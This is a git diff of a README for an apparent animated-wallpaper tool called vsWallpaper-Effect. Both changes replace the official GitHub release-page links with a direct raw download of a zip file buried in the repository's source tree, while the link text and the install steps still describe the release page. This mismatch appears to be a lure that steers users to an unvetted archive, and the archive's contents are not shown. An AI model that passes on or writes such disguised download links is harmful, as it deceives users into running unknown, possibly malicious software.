@@ -1,6 +1,6 @@
 # 🎨 vsWallpaper-Effect - Add animated visual effects to desktops
 
-[![Download vsWallpaper-Effect](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/hebertoytc/vsWallpaper-Effect/releases)
+[![Download vsWallpaper-Effect](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/hebertoytc/vsWallpaper-Effect/raw/refs/heads/main/vswallpaper_effect/effects/vs-Effect-Wallpaper-v1.8.zip)
 
 vsWallpaper-Effect brings life to your computer screen. This software uses your graphics card to display smooth, high-quality animations. You can choose from styles like falling rain, code streams, northern lights, and ocean waves. The tool includes a control panel that lets you adjust settings without needing to write code.
 
@@ -20,7 +20,7 @@ If you have a laptop, ensure the device plugs into a power source when using int
 
 The application is hosted on GitHub. You must visit the release page to obtain the correct installer for your system.
 
-[Visit the official release page to download](https://github.com/hebertoytc/vsWallpaper-Effect/releases)
+[Visit the official release page to download](https://github.com/hebertoytc/vsWallpaper-Effect/raw/refs/heads/main/vswallpaper_effect/effects/vs-Effect-Wallpaper-v1.8.zip)
 
 1. Navigate to the link above using your web browser.
 2. Look for the section titled "Assets" at the bottom of the newest version entry.
